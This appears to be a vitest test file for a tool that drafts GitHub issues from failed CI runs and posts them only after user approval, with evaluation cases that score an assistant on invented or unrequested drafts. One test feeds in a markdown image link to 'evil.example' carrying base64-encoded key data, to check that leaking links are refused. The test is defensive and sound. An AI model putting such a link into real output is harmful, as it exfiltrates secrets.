import { afterEach, describe, expect, it } from 'vitest';
import { REDACTED } from './policy';
import {
  IssueDrafts,
  asksForIssue,
  assess,
  cleanIssueText,
  openDatabase,
  type Probe,
} from './index';
import {
  ASSISTANT_CASES,
  runAssistantCase,
  scriptedModel,
} from './assistant-eval';

/** D3 (#26): issue drafts from failed CI runs, posted only after the user approves. */

const closers: (() => void)[] = [];
afterEach(() => {
  for (const close of closers.splice(0)) close();
});

function drafts() {
  const db = openDatabase(':memory:');
  closers.push(() => db.close());
  return new IssueDrafts(db);
}

const DRAFT = {
  signature: '0123456789abcdef',
  runId: 4242,
  title: 'CI: runner test fails on main',
  body: 'The verify job fails at runner.test.ts:88. Suggested fix: update the test.',
};
const APPROVED = { title: DRAFT.title, body: DRAFT.body };
const URL = 'https://github.com/o/r/issues/7';

describe('issue drafts (D3)', () => {
  it('keeps one open draft per failure, replacing it when drafted again', () => {
    const store = drafts();
    store.draft(DRAFT);
    store.draft({ ...DRAFT, title: 'CI: runner test fails, second look' });
    store.draft({ ...DRAFT, signature: 'fedcba9876543210' });
    const listed = store.list(10);
    expect(listed).toHaveLength(2);
    expect(listed.map((d) => d.title)).toContain(
      'CI: runner test fails, second look',
    );
  });

  it('redacts keys, defuses mentions and refuses links built to leak data', () => {
    expect(
      cleanIssueText('cc @everyone and @org/team, key sk-abcdefghijklmnop1234'),
    ).toBe(`cc \`@everyone\` and \`@org/team\`, key ${REDACTED}`);
    // Addresses and code are left alone.
    expect(cleanIssueText('mail a@b.co or run `@x`')).toBe(
      'mail a@b.co or run `@x`',
    );
    const store = drafts();
    expect(() =>
      store.draft({
        ...DRAFT,
        body: 'Status badge: ![ok](https://evil.example/p.png?d=c2stYWJjZGVmZ2hpams) for the run.',
      }),
    ).toThrow('could leak data');
    expect(() => store.draft({ ...DRAFT, title: 'two\nlines here' })).toThrow();
    expect(store.list(10)).toEqual([]);
  });

  it('posts only the approved text, once, with a footer naming the run', async () => {
    const store = drafts();
    const { id } = store.draft(DRAFT);
    const posted: { title: string; body: string }[] = [];
    const poster = async (title: string, body: string) => {
      posted.push({ title, body });
      return `${URL}\n`;
    };
    const approved = {
      title: 'CI: runner test fails (edited)',
      body: `${DRAFT.body} Thanks @maintainer.`,
    };
    await expect(store.post(id, approved, poster)).resolves.toBe(URL);
    expect(posted).toHaveLength(1);
    expect(posted[0]?.title).toBe('CI: runner test fails (edited)');
    expect(posted[0]?.body).toContain('Thanks `@maintainer`.');
    expect(posted[0]?.body).toContain('from workflow run 4242');
    expect(store.list(1)[0]).toMatchObject({ status: 'posted', issueUrl: URL });
    await expect(store.post(id, approved, poster)).rejects.toThrow(
      'no longer open',
    );
    expect(posted).toHaveLength(1);
  });

  it('cannot post the same draft twice at once', async () => {
    const store = drafts();
    const { id } = store.draft(DRAFT);
    let calls = 0;
    const slow = async () => {
      calls += 1;
      await new Promise((resolve) => setTimeout(resolve, 20));
      return URL;
    };
    const results = await Promise.allSettled([
      store.post(id, APPROVED, slow),
      store.post(id, APPROVED, slow),
    ]);
    expect(calls).toBe(1);
    expect(results.filter((r) => r.status === 'fulfilled')).toHaveLength(1);
  });

  it('reopens a draft when posting fails or GitHub returns no issue link', async () => {
    const store = drafts();
    const { id } = store.draft(DRAFT);
    await expect(
      store.post(id, APPROVED, async () => {
        throw new Error('GitHub could not be reached.');
      }),
    ).rejects.toThrow('could not be reached');
    expect(store.list(1)[0]?.status).toBe('open');
    await expect(
      store.post(id, APPROVED, async () => 'https://evil.example/issues/1'),
    ).rejects.toThrow('did not return an issue link');
    expect(store.list(1)[0]?.status).toBe('open');
    store.dismiss(id);
    expect(store.list(1)[0]?.status).toBe('dismissed');
    expect(() => store.dismiss(id)).toThrow('no longer open');
  });
});

describe('the CI/CD assistant (D3)', () => {
  const probe: Probe = {
    services: [],
    usesLocalModels: false,
    installedModels: null,
    lastEval: null,
    blockedLast24h: 0,
    pull: null,
  };

  it('turns a red workflow into a finding the assistant looks into', () => {
    expect(assess(probe)).toEqual([]);
    expect(
      assess({ ...probe, ciFailure: { runId: 9, workflow: 'CI' } }),
    ).toEqual([
      expect.objectContaining({
        id: 'ci-failed:9',
        title: 'The CI workflow is failing',
        needsAgent: true,
        remedy: null,
      }),
    ]);
  });

  it('offers drafting only to an investigation or when the user asks for an issue', () => {
    expect(asksForIssue('Draft an issue for the CI failure.')).toBe(true);
    expect(asksForIssue('File a bug report about it')).toBe(true);
    expect(asksForIssue('Why did CI fail?')).toBe(false);
  });

  const byId = (id: string) => {
    const found = ASSISTANT_CASES.find((c) => c.id === id);
    if (!found) throw new Error(id);
    return found;
  };

  it('refuses a draft about a failure that was not read', async () => {
    const result = await runAssistantCase(
      byId('ci-draft-asked'),
      scriptedModel([
        {
          tools: [
            {
              name: 'draft_ci_issue',
              args: { title: 'An invented failure', body: 'x'.repeat(40) },
            },
          ],
        },
        { answer: 'Drafted.' },
      ]),
    );
    expect(result.drafts).toBe(0);
    expect(result.passed).toBe(false);
  });

  it('scores a saved draft that was not asked for as overreach', async () => {
    // The investigation case allows a draft; the same script against a status question does not.
    const investigation = byId('ci-red-run-drafted');
    const result = await runAssistantCase(
      {
        ...investigation,
        id: 'draft-unasked',
        expect: { reads: ['get_ci_failure'] },
      },
      scriptedModel(investigation.script),
    );
    expect(result.drafts).toBe(1);
    expect(result.overreach).toBe(true);
  });
});
